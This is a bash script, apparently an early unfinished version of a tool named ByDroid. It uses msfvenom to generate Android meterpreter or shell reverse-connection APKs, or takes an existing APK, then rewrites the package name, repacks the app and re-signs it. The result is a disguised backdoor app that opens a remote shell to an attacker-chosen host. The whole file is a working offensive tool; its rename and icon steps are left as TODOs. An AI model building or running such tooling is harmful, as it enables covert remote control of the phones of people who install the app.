#!/bin/bash
# ByDroid
# Written by Tuxt
# Version 0.1 - 01/Oct/2016

# Constants
readonly VERSION=0.1
readonly SHORTOPTS="hgP:l:p:n:i:o:"
readonly LONGOPTS="help,generate,payload:,lhost:,port:,name:,icon:,output:"
readonly REGEX_PAYLOAD="^android/(meterpreter|shell)/reverse_(http[s]{,1}|tcp)$"
readonly REGEX_NUMERIC="^[0-9]+$"

# Vars
generate=false
payload=
lhost=
port=
name=
icon=
output=$(pwd)/out.apk
package=
file=

# Function: print usage
function print_usage() {
    echo "$(tput bold)ByDroid v.$VERSION$(tput sgr0)"
    echo "Usage: $0 [options] package [file]"
    echo "OPTIONS:"
    echo "  -h, --help                              show this help message and exit"
    echo "  -g, --generate                          generate apk with msfvenom"
    echo "  -P PAYLOAD, --payload=PAYLOAD           use with -g"
    echo "  -l LHOST, --lhost=LHOST                 use with -g"
    echo "  -p PORT, --port=PORT                    use with -g"
    echo "  -n NAME, --name=NAME                    set the application name"
    echo "  -i ICON_FILE, --icon=ICON_FILE          set new icon"
    echo "  -o OUTPUT_FILE, --output=OUTPUT_FILE    set output file"
    echo ""
    echo "$(tput bold)EXAMPLES$(tput sgr0)"
    echo "	$0 -h"
    echo "	$0 com.mynewpackage ./original.apk"
    echo "	$0 -n 'Custom app' -i /home/peter/file.png -o edited.apk com.mynewpackage ./original.apk"
    echo "	$0 -g -P android/shell/reverse_tcp -l 10.0.4.92 -p 4444 -n 'Custom app' -i /home/peter/file.png -o edited.apk com.mynewpackage"
    exit 0
}


# Check dependencies
# TODO Prompt for path to bins
# TODO List the missing dependencies
command -v apktool        > /dev/null &&
#command -v d2j-dex2jar    > /dev/null &&
#command -v d2j-jar2jasmin > /dev/null &&
#command -v d2j-jasmin2jar > /dev/null &&
#command -v d2j-jar2dex    > /dev/null &&
command -v d2j-apk-sign   > /dev/null  || {
    echo "$0: Dependencies not found. Check the files:
	apktool
	d2j-apk-sign" >&2
#	d2j-dex2jar
#	d2j-jar2jasmin
#	d2j-jasmin2jar
#	d2j-jar2dex
    exit 9
}


# Check parameters
param=`getopt -o $SHORTOPTS --long $LONGOPTS -n "$0" -- "$@"`
eval set -- "$param"

while true; do
    case "$1" in
        -h|--help)
            print_usage
            shift 1;;

        -g|--generate)
            generate=true
            shift 1;;

        -P|--payload)
            if [[ ! $2 =~ $REGEX_PAYLOAD ]]; then
                echo "$0: ($1) Invalid payload argument" >&2
                exit 2
            fi
            payload=$2
            shift 2;;

        -l|--lhost)
            lhost=$2
            shift 2;;

        -p|--port)
            if [[ ! $2 =~ $REGEX_NUMERIC ]]; then
                echo "$0: ($1) Port argument is not numeric" >&2
                exit 3
            fi
            port=$2
            if [[ $port -gt 65535 ]]; then
                echo "$0: ($1) Port agument out of range" >&2
                exit 4
            elif [[ $port -lt 1024 || $port -gt 49151 ]]; then
                echo "$0: ($1) WARNING: $port is not a registered port (1024-49151)" >&2
            fi
            shift 2;;

        -n|--name)
            name=$2
            shift 2;;

        -i|--icon)
            if [[ $2 == /* ]]; then
                icon=$2
            else
                icon=$(pwd)/$2
            fi
            if [[ ! -f $icon ]]; then
                echo "$0: ($1) File not found or is not a regular file" >&2
                exit 5
            fi
            shift 2;;

        -o|--output)
            if [[ $2 == /* ]]; then
                output=$2
            else
                output=$(pwd)/$2
            fi
            shift 2;;

        --)
            # Get params
            package=$2
            file=$3
            shift 3;

            # Check needed params
            if $generate && [[ $package == "" ]] || ! $generate && [[ $package == "" || $file == "" ]]; then
                echo "$0: No given package or input file" >&2
                exit 6
            fi

            # If input file used, check path and file
            if ! $generate; then
                if [[ $file != /* ]]; then
                    file=$(pwd)/$file
                fi
                if [[ ! -f $file ]]; then
                    echo "$0: Input file not found or is not a regular file" >&2
                    exit 7
                fi
            fi
            break;;

        *)
            echo "ERROR" >&2
            exit 1
    esac

done


if $generate ; then
    # Check dependencies
    command -v msfvenom > /dev/null || {
        echo "$0: Option -g requires msfvenom" >&2
        # TODO Prompt for path to bin
        exit 10
    }
    
    # Check parameters
    if [[ $payload == "" || $lhost == "" || $port == "" ]]; then
        echo "$0: Option -g requires options -P, -l and -p" >&2
        exit 8
    fi

fi

############################
echo "GENERATE = $generate"
echo "PAYLOAD = $payload"
echo "LHOST = $lhost"
echo "PORT = $port"
echo "NAME = $name"
echo "ICON = $icon"
echo "OUTPUT = $output"
echo "PACKAGE = $package"
echo "FILE = $file"
############################

# Lets work
readonly CURDIR=$(pwd)
readonly TMPDIR=$(mktemp -d)
echo $TMPDIR ############################### DEBUG
cd $TMPDIR

# Generate apk if needed
if $generate; then
    msfvenom -p $payload host=$lhost lport=$port -f raw -o temp.apk &> /dev/null
    file=$TMPDIR/temp.apk
fi

# Unpack file
apktool -o extracted d $file &> /dev/null
cd extracted

# Search package
package_line=$(cat AndroidManifest.xml | grep package)
read -ra line_elems <<< "$package_line"
for i in "${line_elems[@]}"; do
    if [[ "$i" =~ "package=" ]]; then
        old_IFS=$IFS
        IFS='"'
        read -ra original_package <<< $i
        original_package=${original_package[1]}
        IFS=$old_IFS
    fi
done

# Check if found
echo "ORIGINAL PACKAGE = $original_package"
if [[ ! -v original_package || $original_package == "" ]]; then
    echo "$0: Cannot identify the original package" >&2
    cd $CURDIR
    rm -r $TMPDIR
    exit 11
fi

# Change package
original_package_escaped=$(sed 's/[\.]/\\&/g' <<< $original_package)
new_package_escaped=$(sed 's/[\.]/\\&/g' <<< $package)
#find $(pwd) -type f -print0 | xargs -0 sed -i 's/$original_package_escaped/$new_package_escaped/g'
find $(pwd) -type f -print0 | xargs -0 sed -i 's/'"$original_package_escaped"'/'"$new_package_escaped"'/g'

original_package_slashed=${original_package//\./\/}
new_package_slashed=${package//\./\/}
original_package_slashed_escaped=$(sed 's/[\/]/\\&/g' <<< $original_package_slashed)
new_package_slashed_escaped=$(sed 's/[\/]/\\&/g' <<< $new_package_slashed)
#find $(pwd) -type f -print0 | xargs -0 sed -i 's/$original_package_slashed_escaped/$new_package_slashed_escaped/g'
find $(pwd) -type f -print0 | xargs -0 sed -i 's/'"$original_package_slashed_escaped"'/'"$new_package_slashed_escaped"'/g'

# Rename package dir
cd smali
mkdir -p $new_package_slashed
mv $original_package_slashed/* $new_package_slashed
cd ..

# TODO Rename app
# TODO Change icon

# Pack file
cd ..
apktool b extracted -o edited.apk

# Sign file
d2j-apk-sign edited.apk -o $output

# Out
cd $CURDIR
rm -r $TMPDIR

exit 0


